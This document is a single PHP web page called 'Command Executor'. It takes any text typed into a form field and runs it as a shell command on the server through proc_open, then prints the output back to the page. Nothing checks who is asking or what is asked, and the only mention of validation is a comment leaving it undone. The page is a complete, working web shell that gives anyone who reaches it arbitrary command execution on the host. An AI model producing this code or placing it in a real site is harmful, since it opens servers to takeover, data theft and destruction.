<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>
</head>
<body>
    <h2>Enter Command</h2>
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
        <input type="text" name="command" placeholder="Enter command">
        <button type="submit">Execute</button>
    </form>

    <?php
    // Function to execute command with proc_open
    function execute_command_with_proc_open($command) {
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w"),  // stderr
        );

        $process = proc_open('sh', $descriptorspec, $pipes);

        if (is_resource($process)) {
            fwrite($pipes[0], $command . " 2>&1\n"); // redirect stderr to stdout
            fclose($pipes[0]);

            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);

            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);

            // It's important to wait for the process to finish
            proc_close($process);

            return empty($error) ? $output : $error;
        }

        return "proc_open function is disabled or failed to execute.";
    }

    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get the command from the form input
        $command = $_POST["command"];

        // Validate the command (you should implement your own validation logic here)

        // Execute the command using the function
        $result = execute_command_with_proc_open($command);

        // Display the result
        echo "<h2>Command Output</h2>";
        echo "<pre>" . htmlspecialchars($result) . "</pre>";
    }
    ?>
</body>
</html>

